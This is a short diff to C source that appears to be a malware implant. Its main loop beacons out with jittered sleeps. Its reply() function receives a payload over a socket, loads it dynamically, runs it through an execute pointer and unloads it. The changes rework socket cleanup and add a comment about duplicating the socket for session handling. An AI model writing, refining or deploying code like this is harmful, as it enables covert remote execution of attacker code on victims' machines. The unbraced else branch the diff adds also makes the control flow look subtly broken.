@@ -78,7 +78,6 @@ int main(int argc, char *argv[])
         }
         reply(s);
         retry_count = 0;
-        shutdown(s, 2);
         sleep(6 * jitter);
     }
     
@@ -99,8 +98,10 @@ void reply(int s) {
     for (;;) {
         memset( buffer, 0, 512 );
         if ( ( size_recv = recv( s, buffer, sizeof( buffer ), 0 ) ) < 0 ) {
+            shutdown(s, 2);
+            close(s);
             break;
-        } else if (size_recv > 0 ) {
+        } else if ( size_recv > 0 ) {
             int afd;
             char *path;
             pid_t pid;
@@ -138,11 +139,16 @@ void reply(int s) {
                 break;
             }
 
+
             (*execute)();
+
             dlclose(handle);
+            // should dup(2) socket and return fd for better session handling
             break;
 
         } else
+            shutdown(s, 2);
+            close(s);
             break;
     }
 }
@@ -157,4 +163,3 @@ int rand_int(int max) {
 
     return randint;
 }
-
